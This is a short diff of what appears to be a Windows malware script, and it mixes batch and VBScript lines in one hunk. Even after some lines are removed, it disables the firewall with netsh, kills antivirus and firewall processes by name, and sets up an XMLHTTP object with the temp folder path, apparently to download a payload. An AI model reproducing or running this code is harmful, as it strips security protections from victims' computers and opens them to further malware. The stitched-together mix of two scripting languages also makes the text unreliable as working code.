@@ -1,19 +1,10 @@
-@echo off
-rem
-rem Permanently Kill Anti-Virus
-net stop Security Center
 netsh firewall set opmode mode=disable
 tskill /A av*
-tskill /A fire*
 tskill /A anti*
-cls
-tskill /A spy*
 tskill /A bullguard
 tskill /A PersFw
 tskill /A KAV*
 tskill /A ZONEALARM
-tskill /A SAFEWEB
-cls
 Set objEnv = objShell.Environment("User")
 strDirectory = objShell.ExpandEnvironmentStrings("%temp%")
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
